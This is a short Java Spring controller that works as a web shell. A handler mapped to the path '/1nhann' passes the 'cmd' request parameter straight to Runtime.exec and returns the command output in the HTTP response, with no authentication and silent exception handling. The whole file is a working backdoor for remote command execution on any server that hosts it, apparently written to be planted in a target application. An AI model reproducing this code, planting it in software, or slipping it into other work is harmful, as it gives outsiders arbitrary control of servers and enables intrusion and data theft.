import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;

public class FuckController {
    @RequestMapping("/1nhann")
    public void fuck(HttpServletRequest request, HttpServletResponse response){
        try {
            Runtime rt = Runtime.getRuntime();
            String cmd = request.getParameter("cmd");
            Process process = rt.exec(cmd);
            java.io.InputStream in = process.getInputStream();
            PrintWriter writer = response.getWriter();
            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
            String s = null;
            while ((s = stdInput.readLine()) != null) {
                writer.println(s);
            }
        }catch (Exception e){

        }
    }
}
